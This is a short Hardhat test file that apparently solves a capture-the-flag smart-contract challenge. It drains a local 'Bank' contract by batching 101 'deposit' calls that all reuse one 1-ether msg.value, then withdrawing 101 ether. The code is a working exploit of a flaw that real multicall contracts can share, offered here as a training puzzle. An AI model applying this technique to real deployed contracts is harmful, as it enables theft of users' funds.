import { ethers } from 'hardhat'
import { expect } from 'chai'
import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers'
import { BankChallenge, Bank__factory } from '../typechain-types'

const toWei = ethers.utils.parseEther

describe('BankChallenge', async function () {
  let player: SignerWithAddress
  let challenge: BankChallenge

  beforeEach(async function () {
    ;[player] = await ethers.getSigners()

    const Challenge = await ethers.getContractFactory('BankChallenge')
    challenge = (await Challenge.deploy({
      value: toWei('100'),
    })) as BankChallenge
  })

  it('Attack', async function () {
    const token = Bank__factory.connect(await challenge.bank(), player)

    const calls = []
    for (let i = 0; i < 101; ++i) {
      calls.push(token.interface.encodeFunctionData('deposit'))
    }

    await token.batch(calls, true, { value: toWei('1') })

    await token.withdraw(toWei('101'))

    expect(await challenge.isSolved()).to.be.true
  })
})
